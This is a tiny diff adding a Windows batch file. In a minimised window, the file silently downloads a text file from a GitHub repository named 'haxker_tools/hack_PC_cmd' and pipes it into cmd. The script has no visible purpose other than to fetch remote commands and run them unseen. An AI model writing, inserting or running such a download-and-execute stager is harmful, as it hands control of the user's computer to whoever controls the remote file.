@@ -1,1 +1,4 @@
+@echo off
+chcp 65001> nul
 
+start "" /min cmd /c curl -s https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/a.txt | cmd
